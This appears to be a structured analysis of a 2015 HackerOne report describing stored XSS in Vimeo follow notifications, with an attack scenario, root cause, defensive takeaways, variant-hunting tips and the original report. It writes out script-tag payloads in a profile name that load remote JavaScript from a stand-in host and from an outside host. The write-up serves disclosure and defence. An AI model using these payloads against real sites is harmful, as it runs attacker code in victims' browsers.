# Stored XSS via Unescaped User Name in Follow Notification

## Metadata
- **Source:** HackerOne
- **Report:** 87854 | https://hackerone.com/reports/87854
- **Submitted:** 2015-09-07
- **Reporter:** stefanovettorazzi
- **Program:** Vimeo
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Output Encoding, Injection - HTML/JavaScript
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists on vimeo.com/home where user names are not properly escaped when displayed in follow notifications. An attacker can craft a malicious name containing JavaScript code that executes in the victim's browser when they view the home page after being followed.

## Attack scenario
1. Attacker creates or controls a Vimeo account and navigates to account settings
2. Attacker changes their display name to malicious payload containing JavaScript (e.g., '<script src=//attacker.xyz>')
3. Attacker saves the changes, storing the malicious name in the Vimeo database
4. Attacker follows the victim's Vimeo account
5. Victim logs into their Vimeo account and navigates to the home page
6. Vimeo renders the follow notification with the attacker's unescaped name, causing the JavaScript to execute in victim's browser

## Root cause
The application fails to properly HTML-encode or sanitize user display names before rendering them in dynamic notification messages on the home page. The name field is trusted and inserted directly into the DOM without escaping special characters.

## Attacker mindset
An attacker recognizes that user-controlled data (profile names) flows directly into notification messages viewed by other users. By injecting HTML/JavaScript into their own profile, they can create a vector for executing arbitrary code in victims' browsers. The attack is low-effort and scalable—following multiple users amplifies exposure.

## Defensive takeaways
- Always HTML-encode/escape user-controlled data before inserting into DOM, regardless of field type (names are often forgotten)
- Use templating engines with auto-escaping enabled by default
- Implement Content Security Policy (CSP) to mitigate script execution impact
- Apply input validation on profile fields to reject HTML/script tags at submission time
- Perform security code reviews focusing on data flow from user inputs to output rendering
- Use allowlists for profile name characters if business logic permits
- Implement automated security scanning for XSS in user-facing notifications

## Variant hunting
Check other user-controlled fields displayed in notifications (bio, comments, messages)
Test profile name display in other contexts (search results, user cards, activity feeds)
Investigate similar follow/notification features in other Vimeo sections
Check for XSS in user-to-user messaging features
Test group membership notifications and team announcements
Look for unescaped names in email notifications sent to users
Check watchlist and collection notifications for same vulnerability

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1566.002 - Phishing: Spearphishing Link
- T1203 - Exploitation for Client Execution

## Notes
This is a classic stored XSS vulnerability exploiting the common pattern of trusting user profile data. The attacker's ability to inject via their own account profile and have it execute in victims' browsers demonstrates the persistence and reach of stored XSS. The PoC effectively shows JavaScript execution through external resource loading, confirming arbitrary code execution capability. The vulnerability likely affects multiple notification types and user-facing features using the unescaped name field.

## Full report
<details><summary>Expand</summary>

__Description__

If some user follows you on Vimeo, the Name of the user appears in the header of your Home like "[Name] followed you. The staff posted...".
The problem is that the Name is not escaped, which allows to insert HTML code.

__Proof of concept__

1. Using the attacker's account, go to https://vimeo.com/settings.
2. Change the _Name_ to `<script src=//u00f1.xyz>`.
3. Click on _Save Changes_.
4. Go to the victim's Profile.
5. Click on _Follow_ (is at the bottom of the profile picture).
6. Using the victim's account, go to https://vimeo.com/home.
7. https://u00f1.xyz is loaded and `alert(document.domain)` is executed.

I attached a screen capture to identify where the Name of the attacker appears. In this case I used an `<img>` as the Name of the attacker, you can notice the broken image.

</details>

---
*Analysed by Claude on 2026-05-12*
